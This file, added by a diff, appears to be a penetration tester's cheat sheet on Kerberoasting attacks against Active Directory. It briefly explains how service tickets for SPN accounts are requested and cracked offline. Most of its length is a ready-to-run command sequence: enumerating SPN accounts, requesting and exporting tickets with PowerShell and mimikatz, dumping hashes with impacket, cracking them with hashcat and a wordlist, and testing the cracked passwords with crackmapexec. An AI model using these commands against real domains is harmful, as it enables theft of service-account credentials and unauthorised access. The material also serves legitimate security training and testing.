@@ -1,0 +1,69 @@
+[-]======================================[-]
+    Kerberoasting
+[-]======================================[-]
+
+- ---] References
+=====================
+
+# https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec
+
+
+
+- ---] Summary 
+=====================
+
+With our Windows users, we request Kerberos TGS tickets for accounts that are associated with the SPN records in Active Directory (AD). Service Principle Names (SPN) are typically associated with Service accounts and they allow a client to request a service ticket without having the actual account name, through Kerberos authentication. Kerberoasting does not require any kind of unique privileges. If you have any level of access to a domain, then you can look for accounts that are kerberoastable and carry out the attack against it.
+
+[-] Just because you can get the ticket does not mean it's a vulnerability.
+[-] If the service account has a strong password, then cracking it is going to be much harder and your attack will end there.
+[-] You have to crack the hash. They are not passable.
+
+- ---] How it Works
+=====================
+
+When the Kerberoast attack is executed, an adversary can use Domain credentials captured on any user to request Kerberos TGS tickets for accounts that are associated with the SPN records in Active Directory (AD). The TGS tickets are signed with the targeted user or services NTLM hash. This can then be cracked offline to retrieve the clear text password .By default, the tools to automate this process will retrieve the TGS ticket in the encrypted RC4 algorithm.
+
+
+
+- ---] Quick Commands
+======================
+
+# Cracking with hashcat
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+
+
+- ---] Windows Machine Attack
+
+1) # Get Users with SPNs (https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1)
+   # This will go and get all of the accounts for you, similar to impacket. It will find all the kerberoastable accounts for you.
+GetUsersSPNs.ps1
+
+2) # Now you have to go and get the tickets.
+Add-Type -AssemblyName System.IdentityModel
+
+# Now you run this command, specifying the SPN that you want to extract the ticket of. In this case, MSSQLSvc/xor-app23.xor.com:1433
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken - ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"
+
+3) # Extract Tickets. You have to run the New-Object command above for this mimikatz command to work.
+mimikatz # kerberos::list /export
+
+4) # Crack tickets. You can crack the kirby ticke with by just using a python script called ./tgsrepcrack.py or you can use kirbi2john which will convert it to TGS-Rep which Hashcat can use.
+./tgsrepcrack.py <wordlist.txt> <ticket.kirbi>
+kirbi2john <ticket.kirbi> 
+
+
+
+
+- ---] Established Credentials
+=====================
+
+1) # By default GetUserSPNs will search for kerberoastable accounts. The request flag will automatically send the request, perform the attack, and retrieve the hash for cracking.
+impacket-GetUserSPNs domain.local/username:password -dc-ip 10.11.1.120 -request
+
+2) #Once you have the hash, you can crack it. Hashcat mode is 13100 for (Kerberos 5 | TGS-Rep | etype 23)
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+3) # Then take the service account name and the newly cracked password, and attempt to authenticate using smbclient or smbcrack
+crackmapexec smb 10.11.1.120 -u 'serivce-account' -p 'cracked-password'
+
